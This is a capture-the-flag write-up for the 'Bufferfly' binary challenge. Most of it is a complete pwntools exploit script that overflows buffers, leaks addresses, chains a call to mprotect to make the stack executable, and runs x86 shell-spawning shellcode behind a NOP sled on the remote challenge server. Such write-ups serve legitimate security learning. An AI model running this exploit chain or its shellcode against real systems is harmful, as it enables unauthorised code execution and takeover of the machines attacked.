## Bufferfly(197pts) 45 solves ##

![TASK](https://imgur.com/4nNKDaN.png)

The idea is simple , we will do a rop chain and use mprotect to make the stack executable , here is my exploit :

```python
from pwn import *
#p=process("./bufferfly")
p=remote("bufferfly.tghack.no",6002)
OFFSET_vars=cyclic(cyclic_find("aaea"))
payload=OFFSET_vars
payload+="J"+p32(0x1900ffff)
p.recvuntil("yourself.")
p.sendline(payload)
# Part 2
log.info("Part 2 Start")
data=p.recvuntil("you wanna go now?")
LEAKF1=p32(int(data.split(" ")[-17][:-2],16))
log.info("LEAK 1 : "+ data.split(" ")[-17][:-2])
#raw_input("attach gdb dude")
OFFSET=cyclic(31)
payload=OFFSET+"J"
payload+=LEAKF1
p.sendline(payload)
# Part 3
p.recvuntil("looking for?\"")
p.sendline("mprotec")
d=p.recvuntil("done?").split("\n")[1][-11:-1]
log.info("mprotect leaked : "+d)
MPROTECT=p32(int(d,16))
p.sendline("aa")
p.recvuntil("for?\"")
shellcode="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
nop="\x90"*40
p.sendline("mattac")
d=p.recvuntil("here...").split(".")[3][-10:]
log.info("Buffer @ leaked: "+d)
BUFFER=p32(int(d,16)+0x6c)
BUFFERSTART=p32(int(d[:-3]+"000",16))
#raw_input("Attach dude")
p.recvuntil("are you done?")
OFFSET=cyclic(78)
payload=OFFSET+"J"
payload+=MPROTECT
payload+=BUFFER
payload+=BUFFERSTART
payload+=p32(0x1000)
payload+=p32(0x00000007)
p.sendline("done\x00"+payload+nop+shellcode)
p.interactive()

```
For any questions feel free to text me on twitter @BelkahlaAhmed1
